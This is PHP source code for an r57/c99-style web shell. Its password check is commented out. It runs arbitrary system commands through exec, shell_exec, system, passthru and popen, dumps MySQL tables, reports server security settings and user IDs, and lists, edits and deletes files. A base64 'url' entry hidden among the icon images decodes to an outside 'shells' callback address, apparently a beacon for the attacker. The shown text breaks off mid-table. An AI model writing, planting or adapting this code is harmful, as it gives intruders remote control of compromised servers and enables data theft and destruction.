<?
ini_set('memory_limit', '1000M');
$_nexpwd = "p4ssw0rdZ";
//if ($_GET['str'] != $_nexpwd) {die();}


 $images = array(



"change"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAANESURBVHjaYjxx5tZzXh4OHgYk8O3nb4YfP/8zfHhwjkH3aTHD97+WP8+sP7Pw7d173UxMDC+Q1QIEEAsfH6eAhoo0B7Lgr9//GH7+Z2L4+KafQcrgMQPTX2keaVa1onU9924wMjLMZmBEqAUIIJb///7/YUADzKxMDP+fvWQQZN/EwPQaKHDxBMOni0xfPrJwX//99y8D43+EWoAAYmHAAkAWML9ZxsDB8JiB4T0DGJ/nMOb+kJHX9vXzu3hGBsb7rGxsDKwsbAwAAYTVgL+fPjMwf1jEwPwbyPnOxPDsKSPDV4swRnYedttH9587cXJxzb1x5hrD7ZuXGQACCKsBDB/3MzD/ucjA8ION4f/LvwwvpK0YZF2CGb7dvs5w6fvnn2/fvGTYs2MNUOEfBoAAYsKm///DyQysvJwMDF84GN5/5GP4ouHHICQjxcDM8JeBhYWV4cqlK0BV/4CYjQEggDBc8PfFCQZmjltAzcCY/cTA8I5HjUHQIZSB8/9PBj4eXoYjBw8x3LtzHqiSlQ0UYQABhOoCYAj/ezaPgYkDKPwTaPMHHob3Mp4MglLSDCzABMDIzMjw5vVLTpBuIBYBYm6AAGKBRelPUNS8uMjAwv6QgfGPIJDDzvDqOzuDaFAsw68vHxh+//rJ8OnjJwYmRiZgmmGEuZwXIIDgXvgH8tLfH0CGNAMDBy/Dl+dPGd4IWzNw/GNm+Pn6DVAjI8M/oAtBQQQLKlAoAgQQE3Lc//nNCExELgx//7gyXLwmyPBb1YHhDzCd/f33n4GFlQWohhGkC6wRiD8A8VuAAIK7gJWZgeHhy28Ml/YdYZDm5GZgtM1i4FbSZPjz4xvYMmYWJgYubm4GJiamr0Bn/oZgJgaAAGJCdtOP738Ynt96zsBq7M8grGsODOMfDGzAaBMU5GMQExMHuoKZwcbe8begkCwDIyM4EhgAAoiFCQjBSReINY3NGVQMTBmYBYSANv9m+C3Ay8DKzgb0+38GNjZmBmZmFgYuLk6m8KhYhlu3bjLcv3OdASCAWO7eefhh1Yo1PCAnMjIDYwcUWH9+AZ3FDHTZX4b/IE8Dw4CJiZHhAzAWgGHx68vXLwwKCooMqqrqDAABBgD54A4xrMo1ZAAAAABJRU5ErkJggg==",


"delete" =>
"R0lGODlhEAAQANUAAMczNfRxdPRzdPNydPNzddgqL+AsNN8sM8cpMOY2PuU2PsUgK+UwOfJVYPRja/NjavNja/Nka8UYJ8YZKMUZJ8YgLPJUYMUTJfE/UvA/UfJIWPFIWNRldN+cqMpdSc5uXspXRspYRslYRtWIfMlQQ9ymoMlHPslHP8hHP8c9OeBhW/WBfcc9OuNST/WAfvSAfuPExP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADEALAAAAAAQABAAAAZ8wJhwSCwaj0eYZ1QceWBEWKgVYgpHohYIKiyRXCvSp/QhvcIl4ghFEKhMqkHgZCVyWBHIw/FIcZAACg0NFgkASDEIDBsaGgwISBwVGJSUC39FHBOUBRIFGBkUmEIdF6AXHB0cphkXHUMwFwaoQ6sHF1xCsaNCq7mIwMExQQA7",


"folder"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QsKEjkN+d1wUAAAAX9JREFUOMulkU2IUlEYhp9jKv5AposQWgRBtA6CmSCa5SzjYhG0qYggiP6Y3WxmtrMIol1QM84qRKRlSVC2bBcYRpuIIigFC7F7j0fP/WZx7QriBc2XDw6cw/e8L+9Rly6XtorF4jZTMsYE58Dc2tvdf0KE1J17t+X61RszH7X2eLb3lF6vd6VaqT2PBJSci7Q+taJMeNt4M331qFqpPQCIA6TTGY7k8pEA50IpcFMKpRS1F9X7QAAwxuB5Lq8/9ml2Msylww5nbjpSSOnPYYJmJ8PjjXW0sXMxUslD3H1YPxUH8DwXgJ+/NV/af+cCnDiaBSCmtSadnjP6DMVc1w0T/BfgXwdLARZNYK2PHgZlh7+QiPkIICIopRARRMAXwVphaH3MSBiMLEMr5LLJCcDzXI7nBnT7hh9dD0ThI4wHERAEkTEYGFmZAH512pw+e44PX/+MlwJ3EfARBAUiYaqVkwXqL1+R19/L6vy1nYabOLa2aHnZ4bf378qbqyyrA8KHtMqnsOL4AAAAAElFTkSuQmCC",
"small_unk"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".
"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".
"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".
"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4".
"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP".
"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz".
"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ".
"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io".
"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz".
"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM".
"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".
"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".
"yAsokBkQADs=",

"url"=>
"aHR0cDovL24wdHcuYWx0ZXJ2aXN0YS5vcmcvYy5waHA/dHlwZT1zaGVsbHMmYz0=",

"ext_mp3"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_exe"=>
"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
"xhIAOw==",

"ext_html"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAP3SURBVHjaYtxx5BYDIwMUMDLESIjyTeRiZ2H4//8/WOgvEP/69Zfh5+9/DI8ev3jx9NGDKAYmpovc/MIMc6e0MwAEEAszEyPDP6h+pn9/ORWkBYV4OVlhRjL8Bprz5etfhncfPjP8l5IQ4uVh33Lt2i1foAUXQPIAAcSirC3F8PoXI8N7JmaGrw9f//z67S8DCzMrAwvjPwZWVkYGpv+MDIxAJzIB5VlZGBgsjTRlWFiYN99//BpsCEAAsbCxsTCwMjEx/P3NZPmcSTB2/UNmBsb//xi+fv3DoCH8l8FFlZmBg4WVgZ2dleHHr98Ml27cY/jPwCzDxc23BejLQIAAAEEAvv8CAwH/APT1/l/l7P+/IRwHREEtBQAmJgIA+g4GAKHUBgCGufQA9fb1AAgFAwASEAwA9ff+AOjr8QAFBgob/Pz9YQKI6ePP/7qH7zBP5GJhYtfjZ2KQAnqfCehUoIUMnFzMDBuv8TAsOPSeAWgk0GvMDNxc7AxCvOwM4sI8QJf8/wsQQCzbb/9L/vGLgd9KkoHh03cGhku/GBhefmVg+AjEQHFgxDAzrDr4ncFK/jkDDxcfMDwYGbi4OBhYgF4HBs1/gABiOnf9p/mrT78ZXv9hYHj3m4Hh8hMGhquPGBgevmRgeP+NgeHP5+8Mty98ZLj++D0DK/N/Bm4OdmDA/mDg52QDxztAADG9fPyDb/eRDwzTjvxmAJrBYAx0yV+gzfeBBvz68pfh64PXDOxcrAx//4Jih4mBDRgVPDxAlwDZoNgBCCCmPz//Pn15+iXDiyufGF5+ANnAwMD66yfDzcNPGIS/vWb4+uITAycvE1icmQUYlaysDF8/vwMGKhM4nQAEENOz84t2i4mJMHiYcDNI8DMyCAJdZi4FjB9LVgZ9VW4GEWleBgWJHwxSQEOYgdH5H5jsRETFGf4D0wUorQIEENODQ5MWq2h9uSUty8EgJcDAIMfOwOCpy8FQkibOoKbOy+AaKMbgYfiRQVxEDOhkFgZmYJp58fwJMGj/AkOAkQEggFh+fHj54uLq1PhTurMXPXqkpsr5+QMDDzczA5cML8OzN58YBN+dY7DSEGLgFxJl+AUMh3///jDIysgDww/".
"kgv8MAAHEDPLH19ePnpzcsmzLzduvFT4zKGucOP+M4ffnZwyKrI8ZbDVEGBSUNYDqgRr+/WdgAtL37txgEAZ6Y9XKlacAAogFlmn+fnt3X+bv6e0L6tr8P757B4yJvwzcvIIMbBycDH+".
"Bnv0NzI3ADMHw5+8/Bg1dYwYmNmB+YWXlAAggRE4GxsnUeev09+zalvDsySOgwYzgDA2y9T/Df3juBDFBPBYWNsbbN86fBAgwAD3nU17W2F2kAAAAAElFTkSuQmCC",

"ext_jpg"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACjUlEQVQ4jW2STW8jRRCGn+rp+UhGdmKPN5YhwYFIDuxHDrn4Hu6RyE/YC8oPyB+BAzlyzoUjSAgJrbRI5IKEEmmFYKNI3ll2bLPxbpZxnJ5uDjNxshJ96Gqpup56u94W5xwHBwfB/v7+l0op5ZwTgP+JjmoVReH29va+Pj09LTTAysrK4pM/069+fDYA5vcAEEBEQAQl5fnz3ipJknwDlIAoilQYhjSaDQCUSFksglRFSlQZlRAvLrC1taWBKw0QBIFarsVsfBggVVsBBEFEiHwPB7TiiLdXhsai0Ol0NEC5ae2tJ8uEdcXo3ZT82jA1BeIcjcgnDjSeEpYDC7zlzfCCVqt1CwjDUP387Iwf/niJrz18z8PXHrXI53F/lSQYUw8sSoAaXDbvkaV/+3cBnhcv8EGyPB9eLfR41KnRqQc0wgb59B++H/3KLxenrC/cZz1a9eYA3/dVgdBY8HjYjnjQDqjH7xjkf/Fk+Irn+Ut+ev0b6dUIgMfRZwRBcAtQSqn+x00+/WjKi2nG8b9jppezylKfuu7yxb1u5YrwqPaAy1dvbgHOOWnVm7Ro8olz3Pkzt/+hKpbK4qfqqZoDynyZMMaQZRmTyYSiKOh2u2RZhjGGOI5ZW1vDOZkXqAqgbujX19cMBgPOzs4wxnBycsJ4PKbdbmOMwSEU1mKtZQ7wPE8rpd6TubS0xPb2Nv1+nzzPybKM8/NzCmNxtmA2m8ndIXo3T0jTlF6vR7PZpHKInZ0drIWNjR5QoLXH8fHx5e7ubqlAa61vOm9ubpIkyXtqnCtnA5YoihgOh78fHh6+nivI8/wiTdNvnXMWsM45KyLWOWedwxbWFcbMbBSGs8lkkh0dHX03Go2mAP8BZNgCDYdm9o4AAAAASUVORK5CYII=",
"ext_php"=>
"R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg".
"t0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==",
"ext_pl"=>
"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".
"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",
"ext_swf"=>
"R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".
"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".
"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
"ext_tar"=>
"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".
"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".
"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",

"ext_txt"=>
"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAABGdBTUEAALGOfPtRkwAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAACm0lEQVR42mLs7+//z0ABAAhAcRzbAAjDABD8gpXYy6O4ZxKWQCxATUuB4+A4glD8ST/9iAjr3vDobIdzeaNEjn8pCVYcqzHq2JPcNTmXGVXlE0AsMJPMVZkZ/jMwM9hosDD8A7rpHyMTw5/P7xi+Pn/CwCwizcDExcPw99dvhr9AyT9//8JdABBAcAMEuJmgLCgNNOTP60kMDDycDJ8fyjCwKZkxcEqrMPz9/ZPh/3+4NgaAAGLB5i9QoPx+d4mB8VcvA+sHBgbmB44MP6WNGZj+/Gf4B8L//jGwcUDUAgQQE1YD/gGJL/MYWBm/Mfy7y8Lwm1uPgUNei+H/n19A2/8z/EXyAkAAsWCz/e/HWwxMv3cyMHxWYPjySZSByTyCgZHhH9hmkGaQITAAEECYBgAN//9hMQMrMxvDv7dCDD9l/Ri45XUZ/v36BgzAfwyMjIwMzMzMcPUAAQT3AshUkMv/frnDwMx6AxgIqgzfviowsOr6g0QhipmYgC74h2IhQADBXfD9+w+g6awMTJ/2MLCyCDD8+8jI8J1bg4FbQpnhHzDkfwLTAUjNjx+/GTg4WBn4+PjA+gACCOEFYLz/+/aMgeXnKwYGdiWGr58/MfxXcmP48vU7w/cvnxn+/PnD8AuYDkDh8Pv3L7g2gACCG8AE9Bcojv8ymTL8//ST4c3fT0CDRBj+ffgI9vefP38ZLl06C9cIYwMEEMIAoP++//rHcPvQJQZhRT0GBkVHBiZgfLKwMAOdzA5UwQ5WFx4eDqZBybiwsFAYIIAQBjAyMLBx8jIIKhsy8GmZA6MNmLCBgpyc7AysrKxA/3+D2w7VzAUKOoAAghvAwszEwCIqxaAKxNgAFxc3smYWWNQABBALTJBYgKwZBAACDAAKWftvHUTAkgAAAABJRU5ErkJggg==",

 );
 
 if ($_GET[act] == "img") {

header("Content-type: image/gif");
header("Cache-control: public");
header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
header("Cache-control: max-age=".(60*60*24*7));
header("Last-Modified: ".date("r",filemtime(__FILE__)));

$image = $images[$_GET['img']];
  echo base64_decode($image);
  die();
}
// Function for table dump
function getperms ($perms) { // <--- thx to php.net


if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}


function datadump ($table) { // <--- thx to mrwebmaster for function

  # Creo la variabile $result
  $result .= "# Dump of $table \n";
  $result .= "# Dump DATE : " . date("d-M-Y") ."\n\n";

  # Conto i campi presenti nella tabella
  $query = mysql_query("select * from $table");
  $num_fields = @mysql_num_fields($query);

  # Conto il numero di righe presenti nella tabella
  $numrow = mysql_num_rows($query);

  # Passo con un ciclo for tutte le righe della tabella
  for ($i =0; $i<$numrow; $i++)
  {
    $row = mysql_fetch_row($query);

    # Ricreo la tipica sintassi di un comune Dump
    $result .= "INSERT INTO ".$table." VALUES(";

    # Con un secondo ciclo for stampo i valori di tutti i campi
    # trovati in ogni riga
    for($j=0; $j<$num_fields; $j++) {
      $row[$j] = addslashes($row[$j]);
      $row[$j] = ereg_replace("\n","\\n",$row[$j]);
      if (isset($row[$j])) $result .= "\"$row[$j]\"" ; else $result .= "\"\"";
      if ($j<($num_fields-1)) $result .= ",";
    }

    # Chiudo l'istruzione INSERT
    $result .= ");\n";
  }

  return $result . "\n\n\n";
}

// using which THX TO R57
function whicha($pr)
{
$path = exa("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
// executing command THX TO R57
function exa($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
// function pari
function pari($num) {
return ($num%2 == 0) ? TRUE : FALSE;
}


// Getting Directory..
if ($_POST['dir'] == "") {	
	if ($_COOKIE['dir'] == "") {
		$dir=realpath(".");
	}
	else
	{	
		$d = str_replace("\\",DIRECTORY_SEPARATOR,  $_COOKIE['dir']);
		$d = str_replace("\\\\","\\", $_COOKIE['dir']);
		$dir = $d;
	}
}
else
{
	$dir = str_replace("\\",DIRECTORY_SEPARATOR,$_POST['dir']);
	$d = str_replace("\\\\","\\", $_POST['dir']);
	setcookie("dir",$dir);
}

if (substr($dir,-1) != DIRECTORY_SEPARATOR) {$dir .= DIRECTORY_SEPARATOR;}
// Getting something...
$safemode_off_msg = "<font color=green>Safe Mode: OFF</font><br />";
$safemode_on_msg = "<font color=red>Safe Mode: ON</font><br />";
$gpc_off_msg = "<font color=green>Magic Quotes: OFF</font><br />";
$gpc_on_msg = "<font color=red>Magic Quotes: ON</font><br />";
$auf_on_msg = "<font color=green>Allow URL Fopen: ON</font><br />";
$auf_off_msg = "<font color=red>Allow URL Fopen: OFF</font><br />";
$reglobals_on_msg = "<font color=green>Register Globals: ON</font><br />";
$reglobals_off_msg = stripslashes("<font color=red>Register Globals: OFF</font><br />");
$uname = php_uname();
(ini_get("safe_mode") == 0) ? $safemode = $safemode_off_msg : $safemode = $safemode_on_msg;
(ini_get("magic_quotes_gpc") == 0) ? $gpc = $gpc_off_msg : $gpc = $gpc_on_msg;
(ini_get("allow_url_fopen") == 1) ? $auf = $auf_on_msg : $auf = $auf_off_msg;
(ini_get("register_globals") == 1) ? $reglobals = $reglobals_on_msg : $reglobals = $reglobals_off_msg;

$freespace = disk_free_space($dir);
$totalspace = disk_total_space($dir);
$percentfree = round(($freespace*100)/$totalspace);
$percentbusy = 100-$percentfree;
$freespace = intval((($freespace/1024)/1024)/1024);
$totalspace = intval((($totalspace/1024)/1024)/1024);
$freespace .= " GB";
$totalspace .= " GB";
$current_user = "Who are you? ".get_current_user()."<br />";
$uid = "Uid: ".getmyuid()." Gid: ".getmygid()."<br />";

 
if ($_POST['mode'] == "") $_POST['mode'] = "ls";
if ($_POST['mode'] == "ls") {
//Directory listing 
$output .= "<br /><br />Directory listing [ {$dir} ]<br /><div align=left>";
$output .= '<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>

    <td style="border-bottom:#FFFFFF 1px solid;" width="10%">perms</td>
	<td style="border-bottom:#FFFFFF 1px solid;" width="5%">&nbsp;</td>
    <td style="border-bottom:#FFFFFF 1px solid;" width="50%">name</td>
	<td style="border-bottom:#FFFFFF 1px solid;" width="20%">owner/group</td>
    <td style="border-bottom:#FFFFFF 1px solid;" width="15%">actions</td>
  </tr>';
$opendir = opendir($dir)or print("<font color=red>Can't open directory</font>");
$i = 1;
while ($file=readdir($opendir)){
$color = "#333333";

$icons = array(
"txt" => "ext_txt",
"ini" => "ext_txt",
"sql" => "ext_txt",
"php" => "ext_php",
"pl" => "ext_pl",
"html" => "ext_html", "htm" => "ext_html",
"mp3" => "ext_mp3",
"swf" => "ext_swf",
"rar" => "ext_tar",
"zip" => "ext_tar",
"tar" => "ext_tar",
"gz" => "ext_tar",
"bz" => "ext_tar",
"exe" => "ext_exe",
"jpg" => "ext_jpg", "png" => "ext_jpg", "gif" => "ext_jpg");

	if ($dir == realpath(".")) {
		if (is_file($file)){
			
			$ext = array_pop(explode(".",$file));
			if (array_key_exists($ext, $icons)) $icon = $icons[$ext];
			else $icon = "small_unk";
			
			if (function_exists("posix_getpwuid")) {
			$uid = posix_getpwuid(fileowner($file));
			$gr00p = posix_getgrgid(filegroup($file));
			$owner = $uid[name]."/".$gr00p[name]; }
			else
			{
			$owner = fileowner($file)."/".filegroup($file);
			}
			$perms = fileperms($file);
			$info = getperms($perms);
			if (!is_readable($file)) $info = "<font color=red>{$info}</font>";
			elseif (!is_writable($file)) $info = "<font color=white>{$info}</font>";
			else $info = "<font color=green>{$info}</font>";
			$output.= '  <tr style="background-color:'.$color.';">
    <td style="border-bottom:#FFFFFF 1px solid;">'.$info.'</td>
    <td style="border-bottom:#FFFFFF 1px solid;" align="right"><img src="http://'.getenv("HTTP_HOST").$_SERVER['PHP_SELF'].'?act=img&img='.$icon.'" /></td>
    <td style="border-bottom:#FFFFFF 1px solid;">'.$file.'</td>
	<td style="border-bottom:#FFFFFF 1px solid;">'.$owner.'</td>
    <td style="border-bottom:#FFFFFF 1px solid;"><a class="link" href="javascript:document.fedit.modfile.value=\''.$file.'\';document.fedit.submit();"><img src="'.$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'&act=img&img=change" border=0 /></a> - <a class="link" href="javascript:document.delfile.delfile.value=\''.$file.'\';document.delfile.submit();"><img src="'.$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'&act=img&img=delete" border=0 /></a></td>
  </tr>';
			
		}
		else
		{	
			
			if (function_exists("posix_getpwuid")) {
			$uid = posix_getpwuid(fileowner($file));
			$gr00p = posix_getgrgid(filegroup($file));
			$owner = $uid[name]."/".$gr00p[name]; }
			else
			{
			$owner = fileowner($file)."/".filegroup($file);
			}
			$perms = fileperms($file);
			$info = getperms($perms);
			if (!is_readable($file)) $info = "<font color=red>{$info}</font>";
			elseif (!is_writable($file)) $info = "<font color=white>{$info}</font>";
			else $info = "<font color=green>{$info}</font>";
			
			$output.= '  <tr style="background-color:'.$color.';">
    <td style="border-bottom:#FFFFFF 1px solid;">'.$info.'</td>
    <td style="border-bottom:#FFFFFF 1px solid;" align="right"><img src="http://'.getenv("HTTP_HOST").$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'&act=img&img=folder" /></td>';
	    $output .= '<td style="border-bottom:#FFFFFF 1px solid;"><a class="link" href="javascript:document.folder.dir.value=\''.addslashes(realpath($file)).'\';document.folder.submit();">'.$file.'</a></td>
	<td style="border-bottom:#FFFFFF 1px solid;">'.$owner.'</td>
    <td style="border-bottom:#FFFFFF 1px solid;"><a class="link" href="javascript:document.folder.dir.value=\''.addslashes(realpath($file)).'\';document.folder.submit();">Go</a></td>
  </tr>';
			
		}
	}
	else
	{
		chdir($dir);
		if (is_file($file)){
			$ext = array_pop(explode(".",$file));
			if (array_key_exists($ext, $icons)) $icon = $icons[$ext];
			else $icon = "small_unk";
			
			if (function_exists("posix_getpwuid")) {
			$uid = posix_getpwuid(fileowner($file));
			$gr00p = posix_getgrgid(filegroup($file));
			$owner = $uid[name]."/".$gr00p[name]; }
			else
			{
			$owner = fileowner($file)."/".filegroup($file);
			}
			$perms = fileperms($file);
			$info = getperms($perms);
			if (!is_readable($file)) $info = "<font color=red>{$info}</font>";
			elseif (!is_writable($file)) $info = "<font color=white>{$info}</font>";
			else $info = "<font color=green>{$info}</font>";
			$output.= '  <tr style="background-color:'.$color.';">
    <td style="border-bottom:#FFFFFF 1px solid;">'.$info.'</td>
    <td style="border-bottom:#FFFFFF 1px solid;" align="right"><img src="http://'.getenv("HTTP_HOST").$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'&act=img&img='.$icon.'" /></td>
    <td style="border-bottom:#FFFFFF 1px solid;">'.$file.'</td>
	<td style="border-bottom:#FFFFFF 1px solid;">'.$owner.'</td>
    <td style="border-bottom:#FFFFFF 1px solid;"><a class="link" href="javascript:document.fedit.modfile.value=\''.$file.'\';document.fedit.submit();"><img src="'.$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'&act=img&img=change" border=0 /></a> - <a class="link" href="javascript:document.delfile.delfile.value=\''.$file.'\';document.delfile.submit();"><img src="'.$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'&act=img&img=delete" border=0 /></a></td>
  </tr>';
		}
		else
		{
			if (function_exists("posix_getpwuid")) {
			$uid = posix_getpwuid(fileowner($file));
			$gr00p = posix_getgrgid(filegroup($file));
			$owner = $uid[name]."/".$gr00p[name]; }
			else
			{
			$owner = fileowner($file)."/".filegroup($file);
			}
			$perms = fileperms($file);
			$info = getperms($perms);
			if (!is_readable($file)) $info = "<font color=red>{$info}</font>";
			elseif (!is_writable($file)) $info = "<font color=white>{$info}</font>";
			else $info = "<font color=green>{$info}</font>";
			$output.= '  <tr style="background-color:'.$color.';">
    <td style="border-bottom:#FFFFFF 1px solid;">'.$info.'</td>
